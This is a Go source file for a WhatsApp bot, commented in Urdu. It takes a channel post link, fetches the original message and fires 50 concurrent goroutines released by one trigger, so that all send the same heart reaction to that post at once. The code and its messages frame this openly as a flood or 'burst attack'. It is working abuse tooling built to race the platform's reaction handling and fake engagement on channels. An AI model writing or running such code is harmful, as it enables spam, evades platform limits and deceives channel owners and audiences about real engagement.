package main

import (
	"context"
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	waProto "go.mau.fi/whatsmeow/binary/proto"
	"google.golang.org/protobuf/proto"
)

// سپیڈ ٹیسٹ کے لیے فی الحال 50 رکھیں
const FloodCount = 50
const TargetEmoji = "❤️" 

func GetMessageContent(msg *waProto.Message) string {
	if msg == nil { return "" }
	if msg.Conversation != nil { return *msg.Conversation }
	if msg.ExtendedTextMessage != nil && msg.ExtendedTextMessage.Text != nil { return *msg.ExtendedTextMessage.Text }
	if msg.ImageMessage != nil && msg.ImageMessage.Caption != nil { return *msg.ImageMessage.Caption }
	return ""
}

func replyToUser(client *whatsmeow.Client, chatJID types.JID, text string) {
	msg := &waProto.Message{Conversation: proto.String(text)}
	client.SendMessage(context.Background(), chatJID, msg)
}

func StartFloodAttack(client *whatsmeow.Client, v *events.Message) {
	userChat := v.Info.Chat
	fullText := GetMessageContent(v.Message)
	args := strings.Fields(fullText)

	if len(args) < 2 {
		replyToUser(client, userChat, "❌ لنک دو بھائی!")
		return
	}

	link := args[1]
	parts := strings.Split(link, "/")
	if len(parts) < 2 {
		replyToUser(client, userChat, "❌ لنک فارمیٹ غلط ہے۔")
		return
	}

	strMsgID := strings.Split(parts[len(parts)-1], "?")[0]
	inviteCode := parts[len(parts)-2]
	serverMsgID, _ := strconv.Atoi(strMsgID)

	replyToUser(client, userChat, "🔍 سرور سے اوریجنل میسج نکال رہا ہوں...")

	// 1. Get Channel ID
	metadata, err := client.GetNewsletterInfoWithInvite(context.Background(), inviteCode)
	if err != nil {
		replyToUser(client, userChat, fmt.Sprintf("❌ چینل نہیں ملا: %v", err))
		return
	}
	targetJID := metadata.ID

	// 2. FETCH ORIGINAL MESSAGE (To get the perfect Key)
	fetchParams := &whatsmeow.GetNewsletterMessagesParams{
		Count:  1,
		Before: types.MessageServerID(serverMsgID + 1), 
	}
	fetchedMsgs, err := client.GetNewsletterMessages(context.Background(), targetJID, fetchParams)
	
	if err != nil || len(fetchedMsgs) == 0 {
		replyToUser(client, userChat, "❌ میسج fetch نہیں ہو سکا، شاید ڈیلیٹ ہو گیا ہے۔")
		return
	}

	originalMsg := fetchedMsgs[0]
	
	// کنفرمیشن
	if int(originalMsg.MessageServerID) != serverMsgID {
		replyToUser(client, userChat, fmt.Sprintf("⚠️ ID Match نہیں ہوئی (Got: %d, Want: %d)، لیکن پھر بھی ٹرائی کر رہا ہوں۔", originalMsg.MessageServerID, serverMsgID))
	} else {
		replyToUser(client, userChat, fmt.Sprintf("✅ ٹارگٹ لاکڈ! (ID: %d)\n⚡ BURST MODE تیار ہو رہا ہے...", serverMsgID))
	}

	// 3. EXECUTE BURST ATTACK
	// یہاں ہم Original Message کی Key پاس کریں گے
	executeBurst(client, targetJID, originalMsg.Message.Key)
	
	replyToUser(client, userChat, "✅ اٹیک مکمل! 💀")
}

func executeBurst(client *whatsmeow.Client, chatJID types.JID, key *waProto.MessageKey) {
	var wg sync.WaitGroup
	
	// یہ چینل "گن ٹریگر" کا کام کرے گا
	trigger := make(chan bool)
	
	// میسجز کو پہلے سے بنا کر رکھ لیتے ہیں تاکہ CPU ضائع نہ ہو
	fmt.Println(">>> Preparing Warheads...")
	
	// 50 Goroutines تیار کریں
	for i := 0; i < FloodCount; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			
			// ری ایکشن پیکٹ تیار کریں
			// ہم Key وہی استعمال کریں گے جو سرور نے دی ہے (FromMe اور ID چھیڑیں گے نہیں)
			reactionMsg := &waProto.Message{
				ReactionMessage: &waProto.ReactionMessage{
					Key: &waProto.MessageKey{
						RemoteJID: key.RemoteJID,
						FromMe:    key.FromMe, // اہم: جو سرور نے بتایا وہی use کرو
						ID:        key.ID,
					},
					Text:              proto.String(TargetEmoji),
					SenderTimestampMS: proto.Int64(time.Now().UnixMilli()), 
				},
			}

			// یہاں رک جاؤ اور فائر کا انتظار کرو
			<-trigger 
			
			// 🔥 FIRE !!!
			// Context Background استعمال کریں تاکہ کوئی ٹائم آؤٹ نہ ہو
			client.SendMessage(context.Background(), chatJID, reactionMsg)
		}(i)
	}

	// تھوڑا سا انتظار تاکہ سارے Goroutines لائن میں لگ جائیں
	time.Sleep(200 * time.Millisecond)
	fmt.Println(">>> 3... 2... 1... FIRE! 🔥")
	
	// ٹریگر دبا دیا! (اب سب ایک ساتھ بھاگیں گے)
	close(trigger)
	
	wg.Wait()
	fmt.Println(">>> Burst Finished.")
}